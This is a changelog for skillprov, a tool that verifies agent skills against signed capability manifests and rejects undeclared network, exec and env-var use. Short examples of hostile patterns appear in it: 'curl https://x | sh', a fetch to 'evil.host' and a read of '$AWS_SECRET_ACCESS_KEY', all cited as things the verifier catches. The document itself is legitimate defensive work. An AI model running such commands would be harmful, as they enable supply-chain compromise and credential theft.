# Changelog

All notable changes to this project are documented here. The format is based on
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project
adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.4.0] - 2026-07-17

Hardens the verify core and makes the verifier self-describing.

### Fixed

- **m8 — manifest that omits the `network` field no longer verifies green.**
  `declaredFromManifest` (`internal/verify/verify.go`) carried a `|| !c.Network.None`
  clause that treated a manifest with an ABSENT `network` key (zero value
  `{Hosts:nil, None:false}`) as declaring network. A tampered or hand-authored
  manifest that dropped the `network` key could curl any host and still verify
  PASS — an evasion of the literal "reject any capability the skill reaches for
  but did not declare" promise. Network is now declared ONLY when hosts are
  present; `exec`/`env` already handled absence correctly (`len==0` => not
  declared), only network had the wart. New `testdata/net-undeclared` fixture.
- **m10 — scanner skips full-line `#` comments.** `scanFile` skipped `//` and
  `* ` comments but not `#`, so a doc comment like `# attacks use: curl | sh`
  recorded `sh` as an observed exec command and could false-reject a skill whose
  only `sh` mention is a comment. Markdown `#` headings were already gated out;
  shebangs are inert.

### Added

- **m9 — `skillprov version` subcommand.** `.goreleaser.yaml` passed
  `-X main.version={{.Version}}` but `main.go` declared no `var version`, so the
  stamp was a silent no-op and the released binary had no version string and no
  `--version`. `main.go` now owns the `var version = "dev"` symbol the ldflag
  targets, and `cmd/version.go` exposes `skillprov version` printing
  `skillprov <version>` (the goreleaser tag on a release binary, `dev` locally).

### Changed

- The stale `VERSION` file (still `0.2.0` through the v0.3.0 release) is bumped
  to `0.4.0`.

## [0.3.0] - 2026-06-27

Closes the last class-level capability hole. After v0.2 turned the network-host and
env-var allowlists into value-level diffs, `exec` was the only capability still
collapsed to a class boolean: a skill declaring `commands: [git]` could quietly run
`curl https://x | sh` and still verify green. `verify` now diffs the declared exec
**command** allowlist at value granularity, so every undeclared shell-out is named
and rejected — the classic `curl | sh` supply-chain trick included.

### Added

- **m7 — value-level exec command allowlist (`internal/verify/execdiff.go`)**
  When a manifest declares a finite `commands` allowlist (no `"*"` wildcard), every
  observed external command must appear in it; any residual command is an undeclared
  capability and rejects the skill, naming the exact command and its `file:line`. A
  wildcard `"*"` keeps the permissive path for skills that intentionally declared
  open exec.
- The scanner now extracts observed command **names** (`argv[0]`) from exec-style API
  calls (`subprocess.run`, `exec.Command`, …), shell command substitutions
  (`` `…` `` / `$(…)`), bare shell command lines, and piped commands — so
  `curl … | sh` records both `curl` and `sh`. Shell keywords/builtins (`if`, `for`,
  `set`, `echo`, …) are filtered out.
- A new `capabilities.commands:` SKILL.md frontmatter field for declaring the exec
  command allowlist (mirrors `hosts:` / `env-vars:`).
- `testdata/exec-mismatch` fixture: declares `commands: [git]` but pipes a remote
  installer into a shell; `verify` goes red naming the undeclared `curl` and `sh`.

### Changed

- `verify`'s capability-conformance stage now runs the exec allowlist diff alongside
  the existing host and env-var diffs; the rejection message gains an
  `undeclared exec command "<cmd>" observed at <file>:<line>` line.

## [0.2.0] - 2026-06-19

Hardens the core verification promise from class-level to value-level, and ships a
distribution lever so a skill catalog can adopt the gate in one step. `verify` no
longer treats a declared capability class as a blanket pass: the network-host and
env-var allowlists the manifest already carried are now actually diffed.

### Added

- **m6 — composite GitHub Action (`.github/actions/skillprov-verify`)**
  Wrap the exit-1 `verify` binary as a reusable composite action that installs the
  released binary and runs `verify` over one or more skill directories, so any
  catalog or repo can gate skill PRs in one step. A runnable example workflow
  (`.github/workflows/verify-gate.example.yml`) goes red on `testdata/poisoned-skill`
  and `testdata/host-mismatch` and green on `testdata/clean-skill`.
- `testdata/host-mismatch` and `testdata/env-leak` fixtures covering the new
  value-level rejections.

### Changed

- **m4 — network-host allowlist enforced at value level.**
  When a skill declares a finite `network.hosts` allowlist (no `*` wildcard),
  `verify` now diffs observed hosts against it: an off-allowlist host is itself an
  undeclared capability and produces a red `REJECTED` naming the host and its
  file:line. Declaring `api.github.com` no longer permits a quiet fetch to
  `evil.host`. A wildcard `*` keeps the permissive path for skills that
  intentionally declared open network access.
- **m5 — env-var allowlist enforced at value level.**
  The scanner now captures observed env-var names (shell `$VAR`/`${VAR}` and
  `getenv`/`process.env`/`ENV[]` forms, excluding shell built-ins), and `verify`
  rejects any observed env var outside a finite declared `env` allowlist, naming
  the variable. Declaring `env-vars: [TZ]` no longer permits reading
  `$AWS_SECRET_ACCESS_KEY`.

[0.2.0]: https://github.com/SuperMarioYL/skillprov/releases/tag/v0.2.0

## [0.1.0] - 2026-06-15

First public release. A single, dependency-light Go binary that gives an
installable agent skill a signed capability manifest and rejects any skill that
reaches for a capability it never declared.

### Added

- **m1 — capability manifest + SBOM (`skillprov manifest`)**
  Walk a skill directory, compute a per-file sha256 content lock, parse the
  declared capabilities from `SKILL.md` frontmatter, and emit a schema-valid
  `capability-manifest.json` plus a minimal CycloneDX 1.5-subset `sbom.cdx.json`.
  The command also prints a declared-vs-observed table so an author catches a
  missing declaration before they ship. Validated against
  `schema/capability-manifest.v0.schema.json`.
- **m2 — signed provenance bundle (`skillprov sign`)**
  Sign the canonical manifest with a local ed25519 key (auto-generated on first
  use, stored as PEM) and write a detached, self-describing `bundle.sig`. The
  signing path is fully offline. A manifest modified after signing fails the next
  verify.
- **m3 — declared-vs-observed verification (`skillprov verify`)**
  Recompute the content lock, validate the ed25519 signature, then statically
  re-scan the skill and diff observed capabilities (net / fs-write / exec / env)
  against the declared set. Any undeclared capability produces a red `REJECTED`
  verdict with file:line evidence and exit code 1, dropping straight into a CI
  gate or an install pre-hook.
- `testdata/clean-skill` and `testdata/poisoned-skill` so the
  `sign → verify (PASS) → verify (REJECTED)` loop is reproducible out of the box.
- Bilingual README (Chinese primary, English sibling), MIT license, and an
  asciinema demo cast.

[0.3.0]: https://github.com/SuperMarioYL/skillprov/releases/tag/v0.3.0
[0.2.0]: https://github.com/SuperMarioYL/skillprov/releases/tag/v0.2.0
[0.1.0]: https://github.com/SuperMarioYL/skillprov/releases/tag/v0.1.0
